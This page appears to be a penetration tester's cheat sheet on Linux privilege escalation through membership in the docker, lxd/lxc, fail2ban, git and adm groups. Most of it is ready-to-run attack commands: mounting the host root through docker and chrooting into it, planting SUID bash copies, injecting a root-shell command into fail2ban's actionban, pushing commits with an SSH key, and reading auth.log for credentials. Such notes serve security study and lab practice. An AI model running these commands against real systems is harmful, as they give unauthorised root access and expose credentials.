---
title: Dangerous Groups
parent: Method
layout: default
nav_order: 7
---

## docker
1. If you run `id` and notice you are part of docker group can try this.
2. Check where is the docker socket: `find / -name docker.sock 2>/dev/null`\
   (Check if it is at /run/docker.sock)
3. List all the images available: `docker images`
4. Mount the disk and has root permission (prefer ubuntu, put in imagename): \
   `docker run -it -v /:/host/ imagename chroot /host/ bash`
5. (Alternatively) can run the below:\
   `docker run -it --rm --pid=host --privileged ubuntu bash`\
   OR\
   `docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash`
6. If docker is not at /run/docker.sock, use the `-H` parameter, for example:\
   `-H unix:///path/to/docker.sock`

## lxd / lxc
1. Use `id` and if your user is in either lxd or lxc group, can priv esc.
2. Follow here: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
3. Browse to /mnt/root to see the actual filesystem mounted as root.
4. Copy bash and set SUID:
   `cp /mnt/root/bin/bash /mnt/root/tmp/`
   `chmod 7777 /mnt/root/tmp/bash`
5. Use `exit` to exit from container and run `/tmp/bash -p` to get root

## fail2ban
1. Check if you have write access to the following:\
   `ls -la /etc/fail2ban/action.d/iptables-multiport.conf`
2. If yes, use the following:\
   `echo "actionban = cp /bin/bash /tmp/rootbash;chown root /tmp/rootbash;chmod +s /tmp/rootbash" >> ./iptables-multiport.conf`
3. Attempt to login with wrong credentials using ssh / other action that trigger ban.
4. run `/tmp/rootbash -p`

## git
1. If you are able to SSH into an account with git access, can push changes to the local git. First:\
   `GIT_SSH_COMMAND='ssh -i id_rsa -p PORT' git clone git@IP:/gitpathname`
2. Change directory into the git path: `cd gitpathname`
3. Configure the identity of Git:
   `git config --global user.name "kali"`
   `git config --global user.email "kali@kali.(none)"`
4. Make whatever changes to the file (remember to `chmod+x` for executables)
5. Add and commit the change:\
   `git add -A`\
   `git commit -m "pwn"`
6. Push the change:\
   `GIT_SSH_COMMAND='ssh -i ~/id_rsa -p PORT' git push origin master`

## adm
Will usually have access to read logs

1. Check the permission:\
   `ls -la /var/log/auth.log`
2. Read to see if got any credentials that can be used:\
   `cat /var/log/auth.log`